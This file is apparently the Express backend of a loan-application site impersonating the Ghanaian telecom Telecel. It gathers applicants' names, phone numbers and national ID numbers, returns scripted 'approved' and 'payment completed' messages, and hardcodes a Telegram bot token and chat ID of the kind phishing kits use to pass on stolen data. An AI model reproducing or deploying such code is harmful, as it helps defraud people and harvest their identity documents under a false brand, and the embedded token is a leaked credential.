/**
 * Telecel Play Ghana - Express Server
 * Serves the frontend and handles API requests
 */

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw';   // ← paste your token
const CHAT_ID   = '6573120346';     // ← paste your chat ID

// ============================================================
// MIDDLEWARE
// ============================================================

// CORS
app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',
  credentials: true
}));

// Body parser
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Static files
app.use(express.static(path.join(__dirname, '../')));

// ============================================================
// ROUTES
// ============================================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Submit application
app.post('/api/submit-application', (req, res) => {
  try {
    const {
      fullName,
      telecelNumber,
      idType,
      idNumber,
      employment,
      loanAmount,
      loanDays
    } = req.body;

    // Validate required fields
    if (!fullName || !telecelNumber || !idType || !idNumber || !employment) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    // Generate reference number
    const refCode = 'TCL-' + Date.now().toString(36).toUpperCase();

    // Log application (in production, save to database)
    console.log('New Application:', {
      refCode,
      fullName,
      telecelNumber,
      idType,
      idNumber,
      employment,
      loanAmount,
      loanDays,
      timestamp: new Date().toISOString()
    });

    // Return success response
    res.json({
      success: true,
      refCode,
      message: 'Application submitted successfully',
      nextSteps: [
        'Your application is being processed',
        'You will receive an SMS confirmation shortly',
        'Check your Telecel Cash wallet for updates'
      ]
    });
  } catch (error) {
    console.error('Application submission error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to submit application'
    });
  }
});

// Get application status
app.get('/api/application-status/:refCode', (req, res) => {
  try {
    const { refCode } = req.params;

    // In production, query database
    const status = {
      refCode,
      status: 'processing',
      stage: 2,
      stages: [
        { name: 'Application Received', completed: true },
        { name: 'Eligibility Check', completed: false },
        { name: 'Disbursement', completed: false }
      ],
      estimatedCompletion: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString()
    };

    res.json(status);
  } catch (error) {
    console.error('Status check error:', error);
    res.status(500).json({
      error: 'Failed to get application status'
    });
  }
});

// Process payment
app.post('/api/process-payment', (req, res) => {
  try {
    const {
      amount,
      method,
      refCode
    } = req.body;

    if (!amount || !method) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    const transactionId = 'TXN-' + Date.now().toString(36).toUpperCase();

    console.log('Payment Processed:', {
      transactionId,
      amount,
      method,
      refCode,
      timestamp: new Date().toISOString()
    });

    res.json({
      success: true,
      transactionId,
      amount,
      method,
      status: 'completed',
      message: 'Payment processed successfully'
    });
  } catch (error) {
    console.error('Payment processing error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to process payment'
    });
  }
});

// Get FAQ
app.get('/api/faq', (req, res) => {
  const faqData = [
    {
      question: 'What is the interest rate?',
      answer: 'The monthly fee is 8.9%, prorated based on your loan term.'
    },
    {
      question: 'How long does approval take?',
      answer: 'Approval is often instant for eligible Telecel Cash users.'
    },
    {
      question: 'What is the minimum loan amount?',
      answer: 'The minimum loan amount is GH₵100.'
    },
    {
      question: 'What is the maximum loan amount?',
      answer: 'The maximum loan amount is GH₵50,000.'
    },
    {
      question: 'Can I repay early?',
      answer: 'Yes, you can repay your loan early without penalties.'
    },
    {
      question: 'What documents do I need?',
      answer: 'You need a valid ID (Ghana Card, Passport, Voter ID, Driver\'s License, or SSNIT Card).'
    }
  ];

  res.json(faqData);
});

// Serve HTML pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/apply', (req, res) => {
  res.sendFile(path.join(__dirname, '../apply.html'));
});

app.get('/confirm', (req, res) => {
  res.sendFile(path.join(__dirname, '../confirm.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, '../dashboard.html'));
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    error: 'Not Found',
    path: req.path
  });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'development' ? err.message : 'An error occurred'
  });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║           🎉 Telecel Play Ghana - Server Started          ║
║                                                            ║
║  Server running on: http://localhost:${PORT}
║  Environment: ${process.env.NODE_ENV || 'development'}
║  API Health: http://localhost:${PORT}/api/health
║                                                            ║
╚════════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM signal received: closing HTTP server');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('SIGINT signal received: closing HTTP server');
  process.exit(0);
});

module.exports = app;
